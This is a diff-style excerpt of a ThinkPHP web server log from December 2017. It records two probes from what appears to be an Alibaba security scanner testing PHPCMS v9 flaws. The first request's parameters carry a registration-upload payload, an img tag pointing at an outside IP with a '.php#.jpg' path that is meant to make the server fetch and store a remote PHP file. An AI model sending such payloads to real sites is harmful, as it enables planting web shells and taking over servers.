+[ log ] xinchumenye.com:80/index.php?m=member&c=index&a=register&siteid=1 [运行时间：0.023734s][吞吐率：42.13req/s] [内存消耗：2,784.02kb] [文件加载：50]
+[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'identity',
+  'host' => 'xinchumenye.com:80',
+  'connection' => 'close',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.6577126.phpcmsv9-register-upload)',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'content-length' => '171',
+)
+[ info ] [ PARAM ] array (
+  'm' => 'member',
+  'c' => 'index',
+  'a' => 'register',
+  'siteid' => '1',
+  'modelid' => '11',
+  'username' => 'IKrWZjJE',
+  'password' => 'IKrWZjJE',
+  'email' => 'IKrWZjJE@aliyun.com',
+  'info' => 
+  array (
+    'content' => '&lt;img src=http://120.26.55.211/s.txt?.php#.jpg&gt;',
+  ),
+  'dosubmit' => '1',
+  'protocol' => '',
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /webdata/application/index/controller/Index.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ VIEW ] /webdata/application/index/view/index/index.html [ array (
+  0 => 'lunbo',
+  1 => 'tuijian1',
+  2 => 'tuijian2',
+  3 => 'tuijian3',
+  4 => 'tuijian4',
+  5 => 'xilie',
+  6 => 'pinzhi1',
+  7 => 'pinzhi2',
+  8 => 'pinzhi3',
+  9 => 'news',
+  10 => 'link',
+  11 => 'simxilie',
+) ]
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2017-12-11T23:38:19+08:00 ] 172.17.195.153 140.205.225.195 GET /index.php?m=wap&a=index&siteid=1
+[ log ] xinchumenye.com:80/index.php?m=wap&a=index&siteid=1 [运行时间：0.024114s][吞吐率：41.47req/s] [内存消耗：2,782.85kb] [文件加载：50]
+[ info ] [ LANG ] /webdata/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'identity',
+  'host' => 'xinchumenye.com:80',
+  'connection' => 'close',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.6577126.phpcmsv9-attachment-sql)',
+)
+[ info ] [ PARAM ] array (
+  'm' => 'wap',
+  'a' => 'index',
+  'siteid' => '1',
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /webdata/application/index/controller/Index.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ VIEW ] /webdata/application/index/view/index/index.html [ array (
+  0 => 'lunbo',
+  1 => 'tuijian1',
+  2 => 'tuijian2',
+  3 => 'tuijian3',
+  4 => 'tuijian4',
+  5 => 'xilie',
+  6 => 'pinzhi1',
+  7 => 'pinzhi2',
+  8 => 'pinzhi3',
+  9 => 'news',
+  10 => 'link',
+  11 => 'simxilie',
+) ]
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
